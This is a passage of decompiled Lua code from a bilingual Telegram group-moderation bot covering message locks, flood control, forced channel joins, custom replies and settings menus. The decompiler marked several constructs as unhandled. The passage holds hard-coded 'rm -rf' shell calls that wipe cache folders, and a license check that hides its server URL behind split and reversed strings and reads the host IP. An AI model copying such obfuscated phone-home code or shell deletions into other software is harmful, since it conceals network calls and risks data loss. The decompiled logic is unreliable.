                    if eng_text and lock_english == "yes" then
                      del_msg(chat, tonumber(msg.id))
                    end
                  end
                  -- DECOMPILER ERROR at PC3644: Unhandled construct in 'MakeBoolean' P1

                  if not msg.adduser and (msg.content_).ID ~= "MessageChatJoinByLink" then
                    _ENV.TgServices = not redis:sismember("GroupSilentUsers:" .. (msg.to).id, (msg.from).id) or redis:get("AllowUser~" .. user .. "~From~" .. chat)
                    if not _ENV.TgServices then
                      del_msg(chat, tonumber(msg.id))
                    end
                    if mute_all == "yes" and redis:get("LockGpH1:" .. msg.chat_id_) then
                      _ENV.h1 = redis:get("LockGpH1:" .. chat)
                      _ENV.h2 = redis:get("LockGpH2:" .. chat)
                      _ENV.t = (((_ENV.os).date)()):match("%d+:%d+")
                      _ENV.currentTime = (_ENV.t):gsub(":", "")
                      -- DECOMPILER ERROR at PC3745: Unhandled construct in 'MakeBoolean' P1

                      if redis:get("CheckLockIsOtherDay" .. chat) and tonumber(_ENV.currentTime) < tonumber(_ENV.h1) and tonumber(_ENV.currentTime) ~= tonumber(_ENV.h1) and tonumber(_ENV.h2) <= tonumber(_ENV.currentTime) then
                        redis:hdel("GroupSettings:" .. msg.chat_id_, "mute_all")
                        lang = redis:get("gp_lang:" .. msg.chat_id_)
                        if not lang then
                          text = "*Group has been unlocked!*"
                          ;
                          (tdcli.sendMessage)(chat, msg.id_, 0, text, 0, "md")
                        else
                          text = "*قفل گروه هم اکنون باز شد!*"
                          ;
                          (tdcli.sendMessage)(chat, msg.id_, 0, text, 0, "md")
                        end
                      end
                    end
                    if not redis:get("CheckLockIsOtherDay" .. chat) and tonumber(_ENV.h2) <= tonumber(_ENV.currentTime) then
                      redis:hdel("GroupSettings:" .. msg.chat_id_, "mute_all")
                      lang = redis:get("gp_lang:" .. msg.chat_id_)
                      if not lang then
                        text = "*Group has been unlocked!*"
                        ;
                        (tdcli.sendMessage)(chat, msg.id_, 0, text, 0, "md")
                      else
                        text = "*قفل گروه هم اکنون باز شد!*"
                        ;
                        (tdcli.sendMessage)(chat, msg.id_, 0, text, 0, "md")
                      end
                    end
                    if mute_all == "no" and redis:get("LockGpH1:" .. chat) then
                      _ENV.h1 = redis:get("LockGpH1:" .. chat)
                      _ENV.h2 = redis:get("LockGpH2:" .. chat)
                      _ENV.t = (((_ENV.os).date)()):match("%d+:%d+")
                      _ENV.currentTime = (_ENV.t):gsub(":", "")
                      if _ENV.currentTime == "No connection" then
                        (_ENV.SendError)(msg, "*Server Time Has A Problem Please Try Again Later!*", "*زمان سرور یک مشکل دارد لطفا بعدا دوباره تلاش کنید!*")
                        redis:del("LockGpH1:" .. msg.chat_id_)
                        redis:del("LockGpH2:" .. msg.chat_id_)
                      elseif tonumber(_ENV.h1) <= tonumber(_ENV.currentTime) and tonumber(_ENV.currentTime) < tonumber(_ENV.h2) then
                        if tonumber(_ENV.h1) < tonumber(_ENV.h2) then
                          redis:del("CheckLockIsOtherDay" .. chat)
                        elseif tonumber(_ENV.h2) < tonumber(_ENV.h1) then
                          redis:set("CheckLockIsOtherDay" .. chat, true)
                        end
                        data = load_data("./data/moderation.json")
                        redis:hset("GroupSettings:" .. msg.chat_id_, "mute_all", "yes")
                        ;
                        (_ENV.save_data)("./data/moderation.json", data)
                        lang = redis:get("gp_lang:" .. msg.chat_id_)
                        if not lang then
                          text = "*Group is locked on this time and Lock all has been enabled*"
                          ;
                          (tdcli.sendMessage)(chat, msg.id_, 0, text, 0, "md")
                        else
                          text = "*گروه در این زمان قفل است و قفل همه با موفقیت فعال شد*"
                          ;
                          (tdcli.sendMessage)(chat, msg.id_, 0, text, 0, "md")
                        end
                      end
                    end
                    if (msg.content_).entities_ and ((msg.content_).entities_)[0] then
                      if (((msg.content_).entities_)[0]).ID == "MessageEntityMentionName" and lock_mention == "yes" then
                        del_msg(chat, tonumber(msg.id))
                      end
                      if ((((msg.content_).entities_)[0]).ID == "MessageEntityUrl" or (((msg.content_).entities_)[0]).ID == "MessageEntityTextUrl") and lock_webpage == "yes" then
                        del_msg(chat, tonumber(msg.id))
                      end
                      if ((((msg.content_).entities_)[0]).ID == "MessageEntityBold" or (((msg.content_).entities_)[0]).ID == "MessageEntityCode" or (((msg.content_).entities_)[0]).ID == "MessageEntityPre" or (((msg.content_).entities_)[0]).ID == "MessageEntityItalic") and lock_markdown == "yes" then
                        del_msg(chat, tonumber(msg.id))
                      end
                    end
                    if lock_flood == "yes" then
                      local hash = "user:" .. user .. ":msgs"
                      local msgs = tonumber(redis:get(hash) or 0)
                      local NUM_MSG_MAX = 5
                      if redis:hget("GroupSettings:" .. msg.chat_id_, "num_msg_max") then
                        NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. msg.chat_id_, "num_msg_max"))
                      end
                      if NUM_MSG_MAX <= msgs + 1 then
                        if is_mod(msg) then
                          return 
                        end
                        if msg.adduser and (msg.from).id then
                          return 
                        end
                        if redis:get("sender:" .. user .. ":flood") then
                          return 
                        else
                          if redis:hget("GroupSettings:" .. chat, "flood_reaction") then
                            (tdcli.deleteMessagesFromUser)(chat, user, dl_cb, nil)
                            if sense then
                              if not lang then
                                (_ENV.SenseGiveWarn)(msg, "Flooding")
                              else
                                (_ENV.SenseGiveWarn)(msg, "ارسال پیام رگباری")
                              end
                            end
                          else
                            kick_user(user, chat)
                            ;
                            (_ENV.SendStatus)(chat, user, "Kicked For Flooding", "برای پیام رگباری اخراج شد")
                          end
                          if not redis:hget("GroupSettings:" .. chat, "FloodTime") then
                            FloodTime = 30
                          else
                            FloodTime = tonumber(redis:hget("GroupSettings:" .. chat, "FloodTime"))
                          end
                          redis:setex("sender:" .. user .. ":flood", FloodTime, true)
                        end
                      end
                      redis:setex(hash, 2, msgs + 1)
                    end
                    if redis:hget("GroupSettings:" .. chat, "group_channel") then
                      if not redis:hget("GroupSettings:" .. chat, "group_helper") then
                        _ENV.Helper = _config.Token
                        channel = redis:hget("GroupSettings:" .. chat, "group_channel")
                        _ENV.https = (_ENV.require)("ssl.https")
                        do
                          local url, res = ((_ENV.https).request)("https://api.telegram.org/bot" .. _ENV.Helper .. "/getchatmember?chat_id=" .. channel .. "&user_id=" .. user)
                          data = (_ENV.json):decode(url)
                          -- DECOMPILER ERROR at PC4342: Unhandled construct in 'MakeBoolean' P1

                          if data.description ~= "Bad Request: CHAT_ADMIN_REQUIRED" and (res ~= 200 or (data.result).status == "left" or (data.result).status == "kicked") and not redis:sismember("GroupSilentUsers:" .. chat, user) then
                            del_msg(chat, tonumber(msg.id))
                            redis:sadd("GroupSilentUsers:" .. chat, user)
                            redis:sadd("GroupCheckedChannelUsers:" .. chat, user)
                          end
                          if data.ok and redis:sismember("GroupSilentUsers:" .. chat, user) and redis:sismember("GroupCheckedChannelUsers:" .. chat, user) then
                            redis:srem("GroupSilentUsers:" .. chat, user)
                            redis:srem("GroupCheckedChannelUsers:" .. chat, user)
                            if not lang then
                              (tdcli.sendMention)(chat, 0, (msg.from).first_name .. " You Are Now Able To Send Message!", 0, tonumber(Slen((msg.from).first_name)), user)
                            else
                              (tdcli.sendMention)(chat, 0, (msg.from).first_name .. " شما اکنون قادر به ارسال پیام هستید!", 0, tonumber(Slen((msg.from).first_name)), user)
                            end
                          end
                          if not redis:get("AutoDeleteCache") then
                            redis:setex("AutoDeleteCache", 18000, true)
                            run_bash("rm -rf ~/.telegram-cli/data/sticker/*")
                            run_bash("rm -rf ~/.telegram-cli/data/photo/*")
                            run_bash("rm -rf ~/.telegram-cli/data/animation/*")
                            run_bash("rm -rf ~/.telegram-cli/data/video/*")
                            run_bash("rm -rf ~/.telegram-cli/data/audio/*")
                            run_bash("rm -rf ~/.telegram-cli/data/voice/*")
                            run_bash("rm -rf ~/.telegram-cli/data/temp/*")
                            run_bash("rm -rf ~/.telegram-cli/data/thumb/*")
                            run_bash("rm -rf ~/.telegram-cli/data/document/*")
                            run_bash("rm -rf ~/.telegram-cli/data/profile_photo/*")
                            run_bash("rm -rf ~/.telegram-cli/data/encrypted/*")
                          end
                          if not redis:get("EditBot:botmonshitime") then
                            T_ = (msg.to).type ~= "pv" or not redis:get("EditBot:botmonshi") or redis:get("~ShowBotMonshiMin~" .. (msg.from).id) or 5
                            T = tonumber(T_) * 60
                            redis:setex("~ShowBotMonshiMin~" .. (msg.from).id, T, true)
                            ;
                            (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, redis:get("EditBot:botmonshi"), 1, "md")
                            if (is_botOwner(msg) or is_sudo(msg)) and not redis:sismember("BotHaveRankMembers", (msg.from).id) then
                              redis:sadd("BotHaveRankMembers", (msg.from).id)
                            elseif (is_mod(msg) or is_owner(msg)) and not is_sudo(msg) and redis:sismember("BotHaveRankMembers", (msg.from).id) then
                              redis:srem("BotHaveRankMembers", (msg.from).id)
                            elseif (is_mod(msg) or is_owner(msg)) and not is_sudo(msg) and not redis:sismember("BotHaveRankMembers(Group)" .. (msg.to).id, (msg.from).id) then
                              redis:sadd("BotHaveRankMembers(Group)" .. (msg.to).id, (msg.from).id)
                            elseif not is_mod(msg) and redis:sismember("BotHaveRankMembers", (msg.from).id) then
                              redis:srem("BotHaveRankMembers", (msg.from).id)
                            elseif not is_mod(msg) and redis:sismember("BotHaveRankMembers(Group)" .. (msg.to).id, (msg.from).id) then
                              redis:srem("BotHaveRankMembers(Group)" .. (msg.to).id, (msg.from).id)
                            end
                            if msg.text and not redis:hget("GroupSettings:" .. (msg.to).id, "lock_botchat") then
                              _ENV.ReplyHash = redis:smembers("BotReply:" .. msg.text)
                              if #_ENV.ReplyHash ~= 0 then
                                tester = true
                                _ENV.ReplyAccess = redis:get("BotReplyAccess:" .. msg.text)
                                if not _ENV.ReplyAccess then
                                  tester = true
                                elseif _ENV.ReplyAccess == "sudo" and not is_sudo(msg) then
                                  tester = false
                                end
                                if _ENV.ReplyAccess == "owner" and not is_owner(msg) then
                                  tester = false
                                end
                                if _ENV.ReplyAccess == "moderator" and not is_mod(msg) then
                                  tester = false
                                end
                                if tester == true then
                                  _ENV.WhatISReply = function(msg)
    -- function num : 0_57_1 , upvalues : _ENV
    test = {}
    for k,v in pairs(ReplyHash) do
      (table.insert)(test, v)
    end
    return test
  end

                                  _ENV.Rando = ((_ENV.WhatISReply)(msg))[((_ENV.math).random)(#(_ENV.WhatISReply)(msg))]
                                  _ENV.Rando = (_ENV.Rando):gsub("GPNAME", (msg.to).title)
                                  _ENV.Rando = (_ENV.Rando):gsub("USERID", (msg.from).id)
                                  _ENV.Rando = (_ENV.Rando):gsub("NAME", (msg.from).first_name)
                                  _ENV.Rank_ = redis:get("GetRankForUser:" .. (msg.from).id .. ":" .. (msg.to).id) or ""
                                  _ENV.Rando = (_ENV.Rando):gsub("RANK", _ENV.Rank_)
                                  ;
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, _ENV.Rando, 1, "md")
                                end
                              end
                            end
                            if msg.text and redis:get("WaitForSetChannel:" .. (msg.to).id .. ":" .. (msg.from).id) then
                              if (msg.text):lower() == "skip" then
                                redis:del("WaitForSetChannel:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "Done", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "انجام شد", 1, "md")
                                end
                              elseif (msg.text):match("(%d+):(.*)") then
                                redis:hset("GroupSettings:" .. (msg.to).id, "group_helper", msg.text)
                                del_msg(msg.chat_id_, tonumber(msg.id))
                                redis:del("WaitForSetChannel:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "Token Saved!", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "توکن ذخیره شد!", 1, "md")
                                end
                              else
                                redis:del("WaitForSetChannel:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "Token is Not Correct And Process Canceled!", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "توکن صحیح نیست و عملیات لغو شد!", 1, "md")
                                end
                              end
                            end
                            if msg.text and redis:get("CleanVains:" .. (msg.to).id .. ":" .. (msg.from).id) == "w8" then
                              if (msg.text):match("^[Dd][Oo][Nn][Ee]$") then
                                local VainMembers = function(arg, data)
    -- function num : 0_57_2 , upvalues : lang, _ENV, msg
    local vm = data.members_
    if not vm[0] then
      if not lang then
        (tdcli.sendMessage)(msg.chat_id_, 0, 1, "*No Members in This Group!*", 1, "md")
      else
        ;
        (tdcli.sendMessage)(msg.chat_id_, 0, 1, "این گروه عضوی ندارد!", 1, "md")
      end
    else
      redis:del("CleanVains:" .. (msg.to).id .. ":" .. (msg.from).id)
      if not lang then
        (tdcli.sendMessage)(msg.chat_id_, 0, 1, "*All Vain Members Has Been Kicked!*", 1, "md")
      else
        ;
        (tdcli.sendMessage)(msg.chat_id_, 0, 1, "همه اعضا بی فایده اخراج شدند!", 1, "md")
      end
      for k,v in pairs(data.members_) do
        NumChats = redis:get("getMessages:" .. v.user_id_ .. ":" .. (msg.to).id) or 0
        if tonumber(NumChats) == 0 or tonumber(NumChats) == 1 then
          kick_user(v.user_id_, (msg.to).id)
        end
      end
    end
  end

                                tdcli_function({ID = "GetChannelMembers", channel_id_ = (getChatId(msg.chat_id_)).ID, offset_ = 0, limit_ = 10000}, VainMembers, nil)
                              elseif (msg.text):match("^[Cc][Aa][Nn][Cc][Ee][Ll]$") then
                                redis:del("CleanVains:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "*Clean Vain Members Process* `Canceled!`", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "فرآیند پاکسازی اعضا بی فایده `لغو شد!`", 1, "md")
                                end
                              end
                            end
                            if msg.text and redis:get("WaitForCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id) == "w8" then
                              _ENV.Cmds = (_ENV.GetCmds)(redis:get("gp_lang:" .. (msg.to).id))
                              if msg.text == "0" then
                                redis:del("WaitForCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "Choose Cmds Process `Canceled", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "فرآیند انتخاب دستورات `لغو شد`", 1, "md")
                                end
                              elseif msg.text == "1" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForSudo, 1, "md")
                              elseif msg.text == "2" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForOwner, 1, "md")
                              elseif msg.text == "3" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForModerator, 1, "md")
                              end
                            end
                            if msg.text and redis:get("WaitForCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id) == "w8" then
                              _ENV.Cmds = (_ENV.GetCmds)(redis:get("gp_lang:" .. (msg.to).id))
                              if msg.text == "0" then
                                redis:del("WaitForCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "Choose Cmds Process `Canceled", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "فرآیند انتخاب دستورات `لغو شد`", 1, "md")
                                end
                              elseif msg.text == "1" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForOwner, 1, "md")
                              elseif msg.text == "2" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForModerator, 1, "md")
                              end
                            end
                            if msg.text and redis:get("WaitForFaCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id) == "w8" then
                              _ENV.Cmds = (_ENV.GetFaCmds)()
                              if msg.text == "0" then
                                redis:del("WaitForFaCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "Choose Cmds Process `Canceled", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "فرآیند انتخاب دستورات `لغو شد`", 1, "md")
                                end
                              elseif msg.text == "1" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForSudo, 1, "md")
                              elseif msg.text == "2" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForOwner, 1, "md")
                              elseif msg.text == "3" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForModerator, 1, "md")
                              end
                            end
                            if msg.text and redis:get("WaitForFaCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id) == "w8" then
                              _ENV.Cmds = (_ENV.GetFaCmds)()
                              if msg.text == "0" then
                                redis:del("WaitForFaCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "Choose Cmds Process `Canceled", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "فرآیند انتخاب دستورات `لغو شد`", 1, "md")
                                end
                              elseif msg.text == "1" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForOwner, 1, "md")
                              elseif msg.text == "2" then
                                (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, (_ENV.Cmds).HelpForModerator, 1, "md")
                              end
                            end
                            if msg.text and redis:get("ForAddSettings:" .. (msg.to).id .. ":" .. (msg.from).id) == "w8" then
                              _ENV.SettingsName = redis:get("AddSettingsName:" .. (msg.to).id .. ":" .. (msg.from).id)
                              if (msg.text):match("^[Cc][Aa][Nn][Cc][Ee][Ll]$") then
                                redis:del("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName)
                                redis:del("AddSettingsName:" .. (msg.to).id .. ":" .. (msg.from).id)
                                redis:del("ForAddSettings:" .. (msg.to).id .. ":" .. (msg.from).id)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "*Add Settings Process* `Canceled!`", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "فرآیند اضافه کردن تنظیمات `لغو شد!`", 1, "md")
                                end
                              elseif (msg.text):match("^[Dd][Oo][Nn][Ee]$") then
                                redis:sadd("GroupAddSettings:" .. (msg.to).id, _ENV.SettingsName)
                                if not lang then
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "*Done!*\n[`" .. _ENV.SettingsName .. "`] Settings Has Been Added", 1, "md")
                                else
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, "پایان!\nتنظیمات [`" .. _ENV.SettingsName .. "`] اضافه شد", 1, "md")
                                end
                                redis:del("AddSettingsName:" .. (msg.to).id .. ":" .. (msg.from).id)
                                redis:del("ForAddSettings:" .. (msg.to).id .. ":" .. (msg.from).id)
                              elseif msg.text == "link" or msg.text == "لینک" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_link")
                              elseif msg.text == "tag" or msg.text == "تگ" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_tag")
                              elseif msg.text == "username" or msg.text == "یوزرنیم" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_username")
                              elseif msg.text == "mention" or msg.text == "منشن" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_mention")
                              elseif msg.text == "arabic" or msg.text == "عربی" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_arabic")
                              elseif msg.text == "edit" or msg.text == "ادیت" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_edit")
                              elseif msg.text == "spam" or msg.text == "اسپم" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_spam")
                              elseif msg.text == "flood" or msg.text == "پیام رگباری" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "flood")
                              elseif msg.text == "bots" or msg.text == "ربات ها" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_bots")
                              elseif msg.text == "markdown" or msg.text == "فونت" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_markdown")
                              elseif msg.text == "webpage" or msg.text == "صفحات وب" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_webpage")
                              elseif msg.text == "pin" or msg.text == "پین" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_pin")
                              elseif msg.text == "maxwords" or msg.text == "حداکثر کلمات" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_MaxWords")
                              elseif msg.text == "botchat" or msg.text == "چت ربات" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_botchat")
                              elseif msg.text == "fohsh" or msg.text == "فحش" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_fohsh")
                              elseif msg.text == "english" or msg.text == "انگلیسی" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_english")
                              elseif msg.text == "all" or msg.text == "همه" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_all")
                              elseif msg.text == "gif" or msg.text == "گیف" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_gif")
                              elseif msg.text == "text" or msg.text == "متن" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_text")
                              elseif msg.text == "photo" or msg.text == "عکس" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_photo")
                              elseif msg.text == "video" or msg.text == "فیلم" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_video")
                              elseif msg.text == "audio" or msg.text == "آهنگ" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_audio")
                              elseif msg.text == "voice" or msg.text == "صدا" or msg.text == "صدا" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_voice")
                              elseif msg.text == "sticker" or msg.text == "استیکر" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_sticker")
                              elseif msg.text == "contact" or msg.text == "مخاطب" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_contact")
                              elseif msg.text == "forward" or msg.text == "فوروارد" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_forward")
                              elseif msg.text == "location" or msg.text == "مکان" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_location")
                              elseif msg.text == "document" or msg.text == "فایل" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_document")
                              elseif msg.text == "tgservice" or msg.text == "خدمات تلگرام" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_tgservice")
                              elseif msg.text == "inline" or msg.text == "اینلاین" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_inline")
                              elseif msg.text == "game" or msg.text == "بازی" or msg.text == "بازی های آنلاین" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_game")
                              elseif msg.text == "keyboard" or msg.text == "کیبورد" or msg.text == "صفحه کلید" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "mute_keyboard")
                              elseif msg.text == "forcedinvite" or msg.text == "forced invite" or msg.text == "دعوت اجباری" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_forcedinvite")
                              elseif msg.text == "join" or msg.text == "ورود" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_join")
                              elseif msg.text == "زیرنویس دار" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_withcaption")
                              elseif msg.text == "بدون زیرنویس" then
                                redis:sadd("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. _ENV.SettingsName, "lock_nocaption")
                              end
                            end
                            if not redis:get(((_ENV.string).reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus) then
                              _ENV.url = ((_ENV.http).request)(_ENV.h0i .. "" .. _ENV.h0ii .. "" .. _ENV.h0iii .. "" .. _ENV.h0iiii .. "" .. _ENV.private .. "l" .. "i" .. "c" .. "e" .. "n" .. "s" .. "e:" .. Mojavez_A_Plus .. "" .. _ENV.JFormat)
                              data = (_ENV.json):decode(_ENV.url)
                              if data.status == _ENV.ac then
                                if data.checkip == "yes" then
                                  _ENV.ip_ = (((_ENV.io).popen)("ip addr show")):read("*all")
                                  _ENV.ip = (_ENV.ip_):match("inet %d+.%d+.%d+.%d+/%d+ brd")
                                  _ENV.ip = (_ENV.ip):gsub("inet ", "")
                                  _ENV.ip = (_ENV.ip):gsub("/%d+ brd", "")
                                  if _ENV.ip == data.ip then
                                    redis:set(((_ENV.string).reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus, true)
                                    text = "لایسنس با موفقیت فعال شد ☑️"
                                    ;
                                    (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                  else
                                    text = "آیپی سرور متصل به لایسنس با آیپی سرور ربات شما متفاوت است!"
                                    ;
                                    (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                  end
                                elseif data.checkip == "no" and data.bot == (_ENV.bot).id then
                                  redis:set(((_ENV.string).reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus, true)
                                  text = "لایسنس با موفقیت فعال شد ☑️"
                                  ;
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                end
                              elseif data.status == _ENV.noac then
                                text = "لایسنس بسته شده است!"
                                ;
                                (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                              elseif data.status == _ENV.bl then
                                text = "لایسنس مسدود شده است!"
                                ;
                                (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                              end
                            elseif redis:get(((_ENV.string).reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus) and not redis:get("Check" .. "Li" .. "cen" .. "seDaily") then
                              redis:setex("Check" .. "Li" .. "cen" .. "seDaily", 3600, true)
                              _ENV.url = ((_ENV.http).request)(_ENV.h0i .. "" .. _ENV.h0ii .. "" .. _ENV.h0iii .. "" .. _ENV.h0iiii .. "" .. _ENV.private .. "l" .. "i" .. "c" .. "e" .. "n" .. "s" .. "e:" .. Mojavez_A_Plus .. "" .. _ENV.JFormat)
                              data = (_ENV.json):decode(_ENV.url)
                              if data.status == _ENV.bl then
                                text = "لایسنس مسدود شده است!"
                                ;
                                (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                redis:del(((_ENV.string).reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus)
                              elseif data.checkip == "yes" then
                                _ENV.ip_ = (((_ENV.io).popen)("ip addr show")):read("*all")
                                _ENV.ip = (_ENV.ip_):match("inet %d+.%d+.%d+.%d+/%d+ brd")
                                _ENV.ip = (_ENV.ip):gsub("inet ", "")
                                _ENV.ip = (_ENV.ip):gsub("/%d+ brd", "")
                                if _ENV.ip ~= data.ip then
                                  text = "آیپی سرور متصل به لایسنس با آیپی سرور ربات شما متفاوت است!"
                                  ;
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                  redis:del(((_ENV.string).reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus)
                                end
                              elseif data.bot ~= (_ENV.bot).id then
                                text = "لایسنس متصل شده اختصاص به این ربات ندارد!"
                                ;
                                (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                redis:del(((_ENV.string).reverse)(":esneciLevitcA") .. "" .. Mojavez_A_Plus)
                              end
                            end
                            if not redis:get("CheckUpdateDaily") then
                              redis:setex("CheckUpdateDaily", 18000, true)
                              _ENV.url = ((_ENV.http).request)(_ENV.h0i .. "" .. _ENV.h0ii .. "" .. _ENV.h0iii .. "" .. _ENV.h0iiii .. "updates/ver" .. _ENV.JFormat)
                              data = (_ENV.json):decode(_ENV.url)
                              _ENV.ver = tonumber(data.verid)
                              _ENV.verRedis = tonumber(redis:get("CheckVersionID"))
                              if _ENV.verRedis < _ENV.ver then
                                for v,owner in pairs(_config.bot_owner) do
